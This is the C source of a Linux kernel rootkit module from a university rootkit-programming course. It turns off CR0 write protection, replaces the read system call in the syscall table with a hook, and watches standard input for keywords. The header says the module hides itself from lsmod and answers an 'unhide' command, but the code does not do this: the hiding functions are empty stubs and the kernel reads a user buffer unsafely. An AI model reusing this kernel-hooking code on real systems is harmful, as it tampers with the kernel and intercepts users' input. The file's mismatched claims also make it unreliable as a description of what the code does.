
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 6                                                             */
/*                                                                             */
/*   Filename: socket_masker.c                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage: This module is hiding itself in the kernel context. Specifically,  */
/*          it does not show up in /sys/module or in the output of lsmod.      */
/*          Additionaly, it hooks the read system call and if the user types   */
/*          `ping` the rootkit responds with `pong` in the kernel log. This    */
/*          mecahnism is used to check if the rootkit is running. In order to  */
/*          unload the module, the module needs to become visible again.       */
/*          Therefore, the read system call is hooked to look for yet another  */
/*          command, called `unhide`, which makes the module visible.          */
/*                                                                             */
/*******************************************************************************/

#include <linux/module.h>		/* Needed by all kernel modules */
#include <linux/syscalls.h>		/* Needed for __NR_read */
#include <linux/list.h>			/* Needed for linked list interface */

#include "socket_masker.h"
#include "sysmap.h"				/* Needed for ROOTKIT_SYS_CALL_TABLE */


MODULE_LICENSE("GPL");


/* Initialization function which is called when the module is
   insmoded into the kernel. It replaces the read() syscall. */
static int __init socket_masker_start(void)
{
	disable_write_protect_mode();

	/* Store original read syscall address */
	syscall_table = (void *) ROOTKIT_SYS_CALL_TABLE;
	original_read_syscall = (void *) syscall_table[__NR_read];

	/* Overwrite manipulated read syscall */
	syscall_table[__NR_read] = (unsigned long *) my_read_syscall;

	enable_write_protect_mode();

	PRINT("successfully inserted");

	/* A non 0 return value means init_module failed; module can't be loaded */
	return 0;
}


/* Cleanup function which is called just before module
   is rmmoded. It restores the original read() syscall. */
static void __exit socket_masker_end(void)
{
	disable_write_protect_mode();

	/* Restore original read syscall */
	syscall_table[__NR_read] = (unsigned long *) original_read_syscall;

	enable_write_protect_mode();

	PRINT("successfully removed");

	return;
}


void disable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Disable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 0. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 & ~CR0_WRITE_PROTECT_MASK);
}


void enable_write_protect_mode(void)
{
	/* Reading contents of control register cr0. The cr0 register has various
	   control flags that modify the basic operation of the processor. */
	unsigned long original_cr0 = read_cr0();

	/* Enable `write-protect` mode. Do so by setting the WP (Write protect)
	   bit to 1. When set to 1, the CPU can't write to read-only pages */
	write_cr0(original_cr0 | CR0_WRITE_PROTECT_MASK);
}


/* Function that replaces the original read syscall. In addition to what
   read syscall does, it also looks for two commands (`ping` and `unhide`).
   When `ping` is typed, it responds with `pong` in the kernel log. When
   `unhide` is typed, it makes the module visible again */
asmlinkage long my_read_syscall(unsigned int fd, char __user *buf, size_t count)
{
	long ret;
	int matches_count;
	int i;

	/* Call original read syscall */
	ret = original_read_syscall(fd, buf, count);

	/* If the read was not from STDIN don't do anything */
	if (fd != 0)
		return ret;

	/* Check if `ping` was typed */
	if ((matches_count = count_matches(buf, "ping", &heartbeat_matched_so_far)) > 0)
		for (i=0 ; i<matches_count ; i++)
			/* Respond with `pong` in the kernel log */
			PRINT("pong");

	return ret;
}


/* Count matches of specified command in the user input */
int count_matches(char *buf, char *command, int *chars_matched_so_far)
{
	int matches;
	int i;

	/* Match the command */
	matches = i = 0;
	while (i < strlen(buf)) {
		if (command[(*chars_matched_so_far)++] != buf[i++])
			*chars_matched_so_far = 0;

		if (strlen(command) == *chars_matched_so_far) {
			*chars_matched_so_far = 0;
			matches++;
		}
	}

	return matches;
}


/* Hide socket... */
void hide_socket(int port)
{
}


/* Unhide socket... */
void unhide_module(int port)
{
}


module_init(socket_masker_start);
module_exit(socket_masker_end);
